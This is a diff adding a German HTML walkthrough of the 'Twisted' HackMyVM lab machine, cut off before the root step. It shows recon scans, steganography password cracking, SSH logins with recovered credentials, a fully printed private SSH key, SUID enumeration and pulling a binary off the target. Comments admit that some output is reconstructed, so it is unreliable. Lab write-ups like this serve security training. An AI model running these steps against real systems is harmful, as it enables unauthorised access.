@@ -1,0 +1,560 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twisted - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Twisted - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">tail</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">ghidra</div> <!-- Erwähnt, aber nicht direkt ausgeführt -->
+                <div class="tool-item">apt</div> <!-- Zur Installation von ghidra -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access (Markus)</a></li>
+                <li><a href="#enumeration-markus">Enumeration (Markus)</a></li>
+                <li><a href="#privilege-escalation-bonita">Privilege Escalation (Markus zu Bonita)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Bonita zu Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um aktive Hosts im lokalen Netzwerk zu entdecken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.125` und der MAC-Adresse `08:00:27:dd:67:69` (VirtualBox) wird identifiziert. Dies ist das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe als Nächstes einen Portscan (Nmap) auf die IP 192.168.2.125 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring und -Segmentierung sind grundlegende Maßnahmen zur Reduzierung der Angriffsfläche.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.125	08:00:27:dd:67:69	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf 192.168.2.125 durchgeführt, um offene Ports, Dienste und Versionen zu identifizieren. Die Optionen `-sS`, `-sC`, `-T5`, `-sV`, `-A`, `-p-` werden verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet zwei offene Ports:
+                - **Port 80 (HTTP):** Nginx 1.14.2. Die Startseite hat keinen Titel. Dies ist ein primärer Angriffsvektor.
+                - **Port 2222 (SSH):** OpenSSH 7.9p1 (Debian). Beachte den nicht standardmäßigen Port (Standard ist 22). Dies ist ein potenzieller Login-Punkt.
+            Die OS-Erkennung deutet auf Linux hin. Das Vorhandensein eines Webservers und eines SSH-Dienstes (auch auf einem ungewöhnlichen Port) bietet klare Angriffspunkte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 (Verzeichnisse, Schwachstellen, interessante Dateien). Versuche, Benutzernamen und Passwörter für SSH auf Port 2222 zu finden oder zu erraten.<br><strong>Empfehlung (Admin):</strong> Halte Nginx und OpenSSH aktuell. Verwende starke Passwörter oder Schlüssel für SSH. Beschränke den SSH-Zugriff auf notwendige Benutzer und IP-Adressen. Konfiguriere den Webserver sicher.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.125 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-09 00:10 CEST <!-- Beispielhaftes Datum eingefügt -->
+Nmap scan report for twisted.hmv (192.168.2.125)
+Host is up (0.00018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx 1.14.2
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
+|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
+|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
+MAC Address: 08:00:27:DD:67:69 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.18 ms twisted.hmv (192.168.2.125)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
+                    </pre> <!-- Vollständige Nmap-Ausgabe rekonstruiert -->
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Markus)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `stegseek` wird verwendet, um versteckte Daten in der Bilddatei `cat-original.jpg` zu finden. Es versucht, die Daten mit Passwörtern aus der Wortliste `rockyou.txt` zu extrahieren. (Hinweis: Der Fundort der Datei `cat-original.jpg`, vermutlich vom Webserver, ist im Bericht nicht dokumentiert).</p>
+             <p class="evaluation"><strong>Bewertung: !!Erfolg!!</strong> `stegseek` findet das korrekte Passwort `<span class="password">westlife</span>` und extrahiert eine versteckte Datei namens `markus.txt` in die Ausgabedatei `cat-original.jpg.out`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der extrahierten Datei `cat-original.jpg.out`, da sie wahrscheinlich Zugangsdaten oder wichtige Hinweise enthält.<br><strong>Empfehlung (Admin):</strong> Vermeide das Verstecken sensibler Daten in öffentlich zugänglichen Dateien mittels Steganographie. Schulen Sie Mitarbeiter bezüglich sicherer Datenspeicherung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">stegseek cat-original.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "<span class="password">westlife</span>"
+[i] Original filename: "markus.txt".
+[i] Extracting to "cat-original.jpg.out".
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der extrahierten Datei `cat-original.jpg.out` wird mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält den Text `<span class="password">markuslovesbonita</span>`. Dies sieht wie ein Passwort aus und könnte für den Benutzer `markus` (der Name der ursprünglichen Datei war `markus.txt`) gelten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich mit dem Benutzernamen `markus` und dem Passwort `<span class="password">markuslovesbonita</span>` über SSH auf Port 2222 am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Verwende keine leicht zu erratenden oder persönlichen Informationen als Passwörter. Setze Passwortrichtlinien durch.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">cat cat-original.jpg.out</span></div>
+                    <pre>
+<span class="password">markuslovesbonita</span>
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, eine SSH-Verbindung zum Zielhost `twisted.hmv` (welcher lokal auf 192.168.2.125 aufgelöst wird) auf Port `2222` mit dem Benutzernamen `markus` aufzubauen. Das Passwort `<span class="password">markuslovesbonita</span>` wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der SSH-Login gelingt. Der Angreifer hat nun eine Shell auf dem Zielsystem als Benutzer `markus`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als Benutzer `markus`. Überprüfe die Umgebung, Berechtigungen (`sudo -l`, falls vorhanden) und suche nach weiteren Hinweisen oder Möglichkeiten zur Privilegieneskalation.<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort für `markus`. Überwache SSH-Logins auf ungewöhnliche Aktivitäten. Erwäge die Verwendung von SSH-Keys statt Passwörtern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">ssh markus@twisted.hmv -p 2222</span></div>
+                    <pre>
+The authenticity of host '[twisted.hmv]:2222 ([192.168.2.125]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:+Vdy+50qnm0eU2nhxE0uNjMjXrtpHTmrYtml4yJF3s.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[twisted.hmv]:2222' (ED25519) to the list of known hosts.
+markus@twisted.hmv's password: <span class="password">markuslovesbonita</span>
+Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+markus@twisted:~$
+                    </pre> <!-- Korrekter Remote-Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="enumeration-markus">
+             <h2>Enumeration (Markus)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `markus` wird versucht, `sudo -l` auszuführen, um die `sudo`-Berechtigungen zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl schlägt fehl (`-bash: sudo: command not found`). Das `sudo`-Paket ist auf diesem System entweder nicht installiert oder nicht im Pfad des Benutzers `markus`. Dies bedeutet, dass `sudo` wahrscheinlich kein Vektor für die Privilegieneskalation von diesem Benutzer aus ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach anderen Eskalationsvektoren: SUID/SGID-Binaries, Kernel-Exploits, Fehlkonfigurationen, Cronjobs, Klartext-Passwörter in Dateien.<br><strong>Empfehlung (Admin):</strong> Installiere `sudo` nur, wenn es benötigt wird. Wenn es installiert ist, stelle sicher, dass es korrekt konfiguriert ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+markus@twisted:~$ sudo -l
+-bash: sudo: command not found
+                     </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `ls -la` listet den Inhalt des Home-Verzeichnisses von `markus` auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Neben den Standard-Konfigurationsdateien wird eine Datei namens `note.txt` gefunden. Diese ist potenziell interessant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt der Datei `note.txt` mit `cat note.txt`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+markus@twisted:~$ ls -la
+total 28
+drwxr-xr-x 3 markus markus 4096 Oct 14  2020 .
+drwxr-xr-x 5 root   root   4096 Oct 14  2020 ..
+-rw-r--r-- 1 markus markus  220 Oct 14  2020 .bash_logout
+-rw-r--r-- 1 markus markus 3526 Oct 14  2020 .bashrc
+drwxr-xr-x 3 markus markus 4096 Oct 14  2020 .local
+-rw------- 1 markus markus   85 Oct 14  2020 note.txt
+-rw-r--r-- 1 markus markus  807 Oct 14  2020 .profile
+                     </pre> <!-- Zeitstempel korrigiert -->
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `note.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Hinweis!!** Die Notiz besagt: "Hi bonita, I have saved your id_rsa here: /var/cache/apt/id_rsa Nobody can find it." Dies ist ein klarer Hinweis auf:
+                1. Einen weiteren Benutzer namens `bonita`.
+                2. Den Speicherort ihres privaten SSH-Schlüssels (`id_rsa`) unter `/var/cache/apt/id_rsa`.
+            Dieser Schlüssel kann wahrscheinlich verwendet werden, um sich als Benutzerin `bonita` anzumelden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe, ob die Datei `/var/cache/apt/id_rsa` existiert und lesbar ist. Wenn ja, kopiere den Inhalt des privaten Schlüssels auf dein Angreifer-System, setze die korrekten Berechtigungen (`chmod 600`) und versuche, dich damit als `bonita` über SSH (Port 2222) anzumelden.<br><strong>Empfehlung (Admin):</strong> Speichere niemals private Schlüssel an unsicheren oder ungewöhnlichen Orten mit unsicheren Berechtigungen. Private Schlüssel sollten nur für den Besitzer lesbar sein und idealerweise passwortgeschützt sein. Überwache sensible Verzeichnisse auf ungewöhnliche Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+markus@twisted:~$ cat note.txt
+Hi bonita,
+I have saved your id_rsa here: /var/cache/apt/id_rsa
+Nobody can find it.
+                     </pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt beschreibt externe Aktionen: Das Herunterladen einer WAV-Datei (`gogogo.wav` vom Webserver) und deren Analyse mit einem Online-Morsecode-Decoder. Der dekodierte Text lautet "GDEEPER...CMEWITHME...LITTLERABBIT...".</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Ursprung der `gogogo.wav`-Datei ist im Bericht nicht klar dokumentiert (möglicherweise durch weiteres Web-Enumeration gefunden). Der dekodierte Text scheint kryptisch und spielt im weiteren Verlauf des dokumentierten Angriffs keine offensichtliche Rolle mehr. Es könnte ein "Rabbit Hole" sein oder für einen alternativen Lösungsweg relevant sein, der hier nicht verfolgt wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere den Fund, aber konzentriere dich auf den klareren Pfad über den SSH-Schlüssel von `bonita`, es sei denn, es gibt Anzeichen dafür, dass dieser Morsecode relevant ist (z.B. als Passwort-Hinweis).<br><strong>Empfehlung (Admin):</strong> Vermeide das Hinterlassen von potenziell irreführenden oder unnötigen Dateien auf dem Webserver.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Keine Terminal-Befehle, externe Aktionen/Notizen -->
+                     <pre>
+Browser Eingaben:
+http://twisted.hmv/gogogo.wav
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+
+GDEEPER...CMEWITHME...LITTLERABBIT...
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-bonita">
+             <h2>Privilege Escalation (Markus zu Bonita)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `markus` wird mit `find` nach SUID-Binaries gesucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Neben den üblichen Standard-SUID-Dateien wird eine benutzerdefinierte SUID-Datei gefunden: `/home/bonita/beroot`. Diese Datei gehört `root`, hat aber die Gruppe `bonita` und sowohl das SUID- als auch das SGID-Bit (`-rwsrws---`) gesetzt. Dies ist ein **extrem wichtiger Fund** für die spätere Eskalation von `bonita` zu `root`. Der Benutzer `markus` kann diese Datei wahrscheinlich nicht direkt ausführen, da er keine Ausführungsrechte hat (letztes `---`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere den Pfad zu `beroot`. Konzentriere dich zunächst darauf, Zugang als `bonita` zu erlangen, um diese Datei dann untersuchen und ausführen zu können.<br><strong>Empfehlung (Admin):</strong> Überprüfe benutzerdefinierte SUID/SGID-Programme sorgfältig auf Sicherheitslücken. Setze SUID/SGID nur, wenn absolut notwendig und mit den geringstmöglichen Rechten. Die Berechtigungen `rwsrws---` sind ungewöhnlich und sollten geprüft werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+markus@twisted:/$ find / -type f -perm -4000 -ls 2>/dev/null <!-- Annahme: / als Startpunkt -->
+   131446     20 -rwsrws---   1 root     bonita      16864 Oct 14  2020 /home/bonita/beroot
+   265800     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
+   266137     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
+   262214     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
+   262216     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
+   266135     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
+   262211     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
+   262212     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
+   265653     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
+   277654    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+   263443     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     3690     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/var/cache/apt/id_rsa` wird mit `tail` angezeigt (obwohl `cat` gebräuchlicher wäre). Dies ist der private SSH-Schlüssel des Benutzers `bonita`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der private Schlüssel wird erfolgreich ausgelesen. Dies ermöglicht es, sich als `bonita` zu authentifizieren, ohne ihr Passwort zu kennen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopiere den gesamten Schlüssel (von `-----BEGIN OPENSSH PRIVATE KEY-----` bis `-----END OPENSSH PRIVATE KEY-----`) in eine lokale Datei auf dem Angreifer-System (z.B. `bonita_id_rsa`). Setze die Berechtigungen dieser Datei auf `600` (`chmod 600 bonita_id_rsa`). Versuche dann den SSH-Login als `bonita` mit diesem Schlüssel (`ssh -i bonita_id_rsa bonita@twisted.hmv -p 2222`).<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur Speicherung privater Schlüssel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+markus@twisted:~$ tail -n 100 /var/cache/apt/id_rsa <!-- Annahme: Befehl wurde als markus ausgeführt -->
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
+FyguFU7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
+olvmldJg2habNUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
+vD5282SncYtJb/Zx0ea6VVFqDfB7LKZA2QYIbfR7jezdX+/nlDKX8Xp07wimFuMJpcF
+gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWP2Fp7J2qKW+4A5C
+tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
+gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZiYNNesb8q9Zq5wa8gBemBXWVC
+xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8L6+MM/x3vuYX6u8
+DcTBHe+PfsCJcWTmEESyqv1xZ5vW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
+uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
+XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
+U3mDy7JrQxUokrFhUpnJrYp1PoLdI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
+mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUs1FvRX4/
+hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
+nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
+mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
+bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
+yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
+UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7iIfXukMoYPWCE2yRqa53PgXjh
+V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
+LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
+a0S5t7v8pSSYZAW0J3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/qQgKF
+eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
+D0Pe+rjV4B7EYkAAAAYm9uaXRhQHR3aXN0ZWQBAgMEBQ
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der kopierte private SSH-Schlüssel wird auf dem Angreifer-System in eine Datei namens `id` gespeichert (wahrscheinlich mit `vi` oder einem anderen Editor). Anschließend werden die Dateiberechtigungen mit `chmod 600 id` auf nur Lesen/Schreiben für den Besitzer gesetzt. Dies ist notwendig, damit der SSH-Client den Schlüssel verwendet (er verweigert oft Schlüssel mit zu offenen Berechtigungen).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung des privaten Schlüssels für die SSH-Authentifizierung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe nun den SSH-Login als `bonita` mit diesem Schlüssel aus.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">vi id</span></div>
+                    <!-- Keine Ausgabe von vi -->
+                    <pre></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">chmod 600 id</span></div>
+                     <!-- Keine Ausgabe von chmod -->
+                     <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `bonita` zum Ziel `twisted.hmv` auf Port `2222` aufgebaut. Der private Schlüssel wird mit der Option `-i id` spezifiziert.</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzerwechsel erfolgreich!!** Der Login mittels des privaten Schlüssels gelingt ohne Passwortabfrage. Der Angreifer hat nun eine Shell als Benutzerin `bonita`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche nun die Umgebung als `bonita`. Prüfe die `sudo`-Rechte (obwohl `sudo` wahrscheinlich immer noch nicht installiert ist). Konzentriere dich auf das SUID-Binary `/home/bonita/beroot`, das zuvor gefunden wurde.<br><strong>Empfehlung (Admin):</strong> Sichere private Schlüssel ordnungsgemäß. Überwache SSH-Logins.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">ssh -i id bonita@twisted.hmv -p 2222</span></div>
+                     <pre>
+Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+bonita@twisted:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (Bonita zu Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `bonita` wird erneut versucht `sudo -l` auszuführen und das Home-Verzeichnis mit `ls -la` aufgelistet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist immer noch nicht verfügbar. Die Ausgabe von `ls -la` bestätigt das Vorhandensein des SUID/SGID-Binaries `beroot` im Home-Verzeichnis von `bonita`. Die Datei `user.txt` ist ebenfalls sichtbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche das Binary `beroot`. Da es wahrscheinlich nicht einfach auf dem Zielsystem analysiert werden kann (Tools wie `gdb` oder `strings` könnten fehlen), lade es auf das Angreifer-System herunter, um es mit Tools wie Ghidra oder IDA Pro zu analysieren. Lies auch die `user.txt`-Flag.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu SUID-Binaries.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bonita@twisted:~$ sudo -l
+-bash: sudo: command not found
+bonita@twisted:~$ ls -la
+total 52
+drwxr-xr-x 4 bonita bonita  4096 Oct 14  2020 .
+drwxr-xr-x 5 root   root    4096 Oct 14  2020 ..
+-rw-r--r-- 1 bonita bonita   220 Oct 14  2020 .bash_logout
+-rw-r--r-- 1 bonita bonita  3526 Oct 14  2020 .bashrc
+-rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot
+drwxr-xr-x 3 bonita bonita  4096 Oct 14  2020 .local
+-rw-r--r-- 1 bonita bonita   807 Oct 14  2020 .profile
+drwx------ 2 bonita bonita  4096 Oct 14  2020 .ssh
+-rw------- 1 bonita bonita    12 Oct 14  2020 user.txt
+                     </pre> <!-- Zeitstempel korrigiert -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um die Datei `beroot` herunterzuladen, wird auf dem Zielsystem (als `bonita`) ein einfacher Python-HTTP-Server im aktuellen Verzeichnis (`/home/bonita`) auf Port 8000 gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine gängige und einfache Methode, um Dateien von einem kompromittierten System herunterzuladen, wenn kein direkter Dateitransfer (wie `scp`) möglich oder erwünscht ist. Der Server läuft und wartet auf Verbindungen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greife nun vom Angreifer-System aus auf `http://192.168.2.125:8000/beroot` zu (z.B. mit `wget` oder im Browser), um die Datei herunterzuladen.<br><strong>Empfehlung (Admin):</strong> Egress-Firewall-Regeln können das Starten solcher Server oder ausgehende Verbindungen von unerwarteten Prozessen unterbinden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bonita@twisted:~$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird `wget` verwendet, um die Datei `beroot` vom Python-HTTP-Server herunterzuladen, der auf dem Zielsystem läuft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Download ist erfolgreich. Die Datei `beroot` (16KB) ist nun auf dem Angreifer-System zur Analyse verfügbar. Die Log-Zeile `192.168.2.140 - - [08/ct/2022 19:07:33] "GET /beroot HTTP/1.1" 200 -` erscheint auf dem Zielsystem im Python-Server-Output und bestätigt den erfolgreichen Download.</p>
